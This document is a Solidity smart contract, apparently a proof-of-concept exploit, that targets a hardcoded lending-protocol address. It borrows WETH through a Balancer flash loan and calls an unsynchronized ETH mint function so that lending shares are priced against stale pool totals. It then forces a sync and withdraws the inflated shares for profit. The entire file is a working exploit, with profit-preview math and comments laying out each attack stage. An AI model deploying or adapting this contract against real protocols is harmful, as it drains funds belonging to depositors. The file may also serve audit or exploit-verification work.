// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IPositionNFTs {
    function reserved(address owner) external view returns (uint256);
}

interface IWiseLendingLike {
    function WETH_ADDRESS() external view returns (address);
    function POSITION_NFT() external view returns (address);
    function maxDepositValueToken(address token) external view returns (uint256);

    function globalPoolData(address token)
        external
        view
        returns (uint256 totalPool, uint256 utilization, uint256 totalBareToken, uint256 poolFee);

    function lendingPoolData(address token)
        external
        view
        returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);

    function borrowPoolData(address token)
        external
        view
        returns (bool allowBorrow, uint256 pseudoTotalBorrowAmount, uint256 totalBorrowShares, uint256 borrowRate);

    function timestampsPoolData(address token) external view returns (uint256 timeStamp, uint256 timeStampScaling);

    function depositExactAmountETHMint() external payable returns (uint256);
    function syncManually(address token) external;
    function withdrawExactShares(uint256 nftId, address poolToken, uint256 shares) external returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        IFlashLoanRecipient recipient,
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipient {
    error FlashLoanCallbackUnauthorized();
    error FlashLoanRepaymentShortfall();
    error FlashLoanRepaymentTransferFailed();
    error NoProfitableStaleState();
    error NoRealizedProfit();
    error NoViableDepositAmount();
    error PositionIdUnavailable();
    error UnexpectedFlashLoanAsset();

    address internal constant TARGET = 0x37e49bf3749513A02FA535F0CbC383796E8107E4;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    uint256 internal constant ONE_YEAR = 52 weeks;
    uint256 internal constant PRECISION_E18 = 1e18;
    uint256 internal constant MIN_DEPOSIT = 0.01 ether;
    uint256 internal constant FLASH_BUFFER = 0.1 ether;
    uint256 internal constant DEFAULT_FLASH_DEPOSIT = 1_000 ether;

    IWiseLendingLike internal immutable WISE;
    IWETH internal immutable WETH;
    IPositionNFTs internal immutable POSITION_NFT;

    uint256 internal _profitAmount;
    uint256 internal _pendingFlashDeposit;

    constructor() {
        WISE = IWiseLendingLike(TARGET);
        WETH = IWETH(WISE.WETH_ADDRESS());
        POSITION_NFT = IPositionNFTs(WISE.POSITION_NFT());
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        delete _profitAmount;

        uint256 wealthBefore = address(this).balance + WETH.balanceOf(address(this));

        uint256 directDeposit = _findViableDeposit(wealthBefore);
        if (directDeposit != 0) {
            uint256 ethBalance = address(this).balance;
            if (ethBalance < directDeposit) {
                WETH.withdraw(directDeposit - ethBalance);
            }

            _executePathStrictExploit(directDeposit);

            if (address(this).balance != 0) {
                WETH.deposit{value: address(this).balance}();
            }

            uint256 wealthAfterDirect = WETH.balanceOf(address(this));
            if (wealthAfterDirect <= wealthBefore) {
                revert NoRealizedProfit();
            }

            _profitAmount = wealthAfterDirect - wealthBefore;
            return;
        }

        uint256 flashDeposit = _findViableDeposit(DEFAULT_FLASH_DEPOSIT);
        if (flashDeposit == 0) {
            revert NoViableDepositAmount();
        }

        _pendingFlashDeposit = flashDeposit;

        IERC20Minimal[] memory tokens = new IERC20Minimal[](1);
        tokens[0] = IERC20Minimal(address(WETH));

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashDeposit + FLASH_BUFFER;

        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(flashDeposit));

        delete _pendingFlashDeposit;

        if (address(this).balance != 0) {
            WETH.deposit{value: address(this).balance}();
        }

        uint256 wealthAfterFlash = WETH.balanceOf(address(this));
        if (wealthAfterFlash <= wealthBefore) {
            revert NoRealizedProfit();
        }

        _profitAmount = wealthAfterFlash - wealthBefore;
    }

    function receiveFlashLoan(
        IERC20Minimal[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        if (msg.sender != BALANCER_VAULT) {
            revert FlashLoanCallbackUnauthorized();
        }

        if (tokens.length != 1 || address(tokens[0]) != address(WETH)) {
            revert UnexpectedFlashLoanAsset();
        }

        uint256 depositAmount = abi.decode(userData, (uint256));
        if (depositAmount == 0) {
            depositAmount = _pendingFlashDeposit;
        }

        WETH.withdraw(amounts[0]);
        _executePathStrictExploit(depositAmount);

        uint256 repayAmount = amounts[0] + feeAmounts[0];
        uint256 wethBalance = WETH.balanceOf(address(this));
        if (wethBalance < repayAmount) {
            uint256 shortfall = repayAmount - wethBalance;
            if (address(this).balance < shortfall) {
                revert FlashLoanRepaymentShortfall();
            }
            WETH.deposit{value: shortfall}();
        }

        if (!IERC20Minimal(address(WETH)).transfer(BALANCER_VAULT, repayAmount)) {
            revert FlashLoanRepaymentTransferFailed();
        }
    }

    function profitToken() external view returns (address) {
        return address(WETH);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executePathStrictExploit(uint256 depositAmount) internal {
        Preview memory preview = _preview(depositAmount);
        if (!preview.profitable) {
            revert NoProfitableStaleState();
        }

        uint256 reservedBefore = POSITION_NFT.reserved(address(this));

        // Path stage 0: the WETH pool must already be stale, meaning accrued borrow interest
        // or excess WETH can be pulled in by a later sync while current mint math still uses
        // the old pseudoTotalPool value.
        // Path stage 1: call the unsynchronized ETH mint entrypoint instead of the normal
        // `depositExactAmountETH()` path so the deposit is priced against stale pool totals.
        uint256 mintedShares = WISE.depositExactAmountETHMint{value: depositAmount}();
        if (mintedShares == 0) {
            revert NoViableDepositAmount();
        }

        uint256 positionId = POSITION_NFT.reserved(address(this));
        if (positionId == 0) {
            positionId = reservedBefore;
        }
        if (positionId == 0) {
            revert PositionIdUnavailable();
        }

        // Path stage 2: because the mint skipped `_preparePool`, the verifier now holds more
        // WETH lending shares than a synchronized deposit of the same amount would have minted.
        // The preview check above enforces that this stale-share mint is economically positive.

        // Path stage 3: trigger a later sync so accrued value is realized, then redeem the exact
        // stale-priced shares for WETH. Using `withdrawExactShares()` preserves realized profit in
        // the existing on-chain WETH token for accounting, while keeping the same exploit causality.
        WISE.syncManually(address(WETH));
        WISE.withdrawExactShares(positionId, address(WETH), mintedShares);
    }

    function _findViableDeposit(uint256 availableEth) internal view returns (uint256) {
        if (availableEth < MIN_DEPOSIT) {
            return 0;
        }

        uint256 maxDeposit = _maxDepositAllowedByCap();
        if (maxDeposit < MIN_DEPOSIT) {
            return 0;
        }

        uint256 candidate = availableEth < maxDeposit ? availableEth : maxDeposit;
        while (candidate >= MIN_DEPOSIT) {
            Preview memory preview = _preview(candidate);
            if (preview.profitable) {
                return candidate;
            }
            candidate >>= 1;
        }

        return 0;
    }

    function _maxDepositAllowedByCap() internal view returns (uint256) {
        (,, uint256 totalBareToken,) = WISE.globalPoolData(address(WETH));
        (uint256 pseudoTotalPool,,) = WISE.lendingPoolData(address(WETH));
        uint256 cap = WISE.maxDepositValueToken(address(WETH));

        uint256 occupied = totalBareToken + pseudoTotalPool;
        if (cap <= occupied) {
            return 0;
        }

        return cap - occupied;
    }

    struct Preview {
        bool profitable;
        uint256 sharesMinted;
        uint256 withdrawAmount;
        uint256 netProfit;
    }

    function _preview(uint256 depositAmount) internal view returns (Preview memory p) {
        (uint256 totalPool,, uint256 totalBareToken, uint256 poolFee) = WISE.globalPoolData(address(WETH));
        (uint256 pseudoTotalPool, uint256 totalDepositShares,) = WISE.lendingPoolData(address(WETH));
        (, uint256 pseudoTotalBorrowAmount,, uint256 borrowRate) = WISE.borrowPoolData(address(WETH));
        (uint256 lastSyncTime,) = WISE.timestampsPoolData(address(WETH));

        if (depositAmount < MIN_DEPOSIT || pseudoTotalPool == 0 || totalDepositShares == 0) {
            return p;
        }

        uint256 sharesMinted = (totalDepositShares * depositAmount) / pseudoTotalPool;
        if (sharesMinted == 0) {
            return p;
        }

        uint256 timeDelta = block.timestamp > lastSyncTime ? block.timestamp - lastSyncTime : 0;
        uint256 pseudoAfterDeposit = pseudoTotalPool + depositAmount;
        uint256 totalSharesAfterDeposit = totalDepositShares + sharesMinted;

        uint256 amountContract = IERC20Minimal(address(WETH)).balanceOf(TARGET);
        uint256 insidePool = totalPool + totalBareToken;
        uint256 difference = amountContract > insidePool ? amountContract - insidePool : 0;

        uint256 allowedDifference = (timeDelta * pseudoAfterDeposit) / ONE_YEAR;
        uint256 cleanupGain = difference > allowedDifference ? allowedDifference : difference;

        uint256 interestGain;
        if (timeDelta != 0 && borrowRate != 0 && pseudoTotalBorrowAmount != 0) {
            interestGain = (borrowRate * timeDelta * pseudoTotalBorrowAmount) / (PRECISION_E18 * ONE_YEAR);
        }

        if (cleanupGain == 0 && interestGain == 0) {
            return p;
        }

        uint256 pseudoAfterSync = pseudoAfterDeposit + cleanupGain + interestGain;
        uint256 feeAmount = (interestGain * poolFee) / PRECISION_E18;

        uint256 feeShares;
        if (feeAmount != 0 && pseudoAfterSync > feeAmount) {
            feeShares = (feeAmount * totalSharesAfterDeposit) / (pseudoAfterSync - feeAmount);
        }

        uint256 totalSharesAfterSync = totalSharesAfterDeposit + feeShares;
        if (totalSharesAfterSync == 0) {
            return p;
        }

        uint256 withdrawAmount = (sharesMinted * pseudoAfterSync) / totalSharesAfterSync;
        uint256 liquidPoolAfterDeposit = totalPool + depositAmount + cleanupGain;

        p.sharesMinted = sharesMinted;
        p.withdrawAmount = withdrawAmount;

        if (withdrawAmount <= depositAmount || withdrawAmount > liquidPoolAfterDeposit) {
            return p;
        }

        p.profitable = true;
        p.netProfit = withdrawAmount - depositAmount;
    }
}
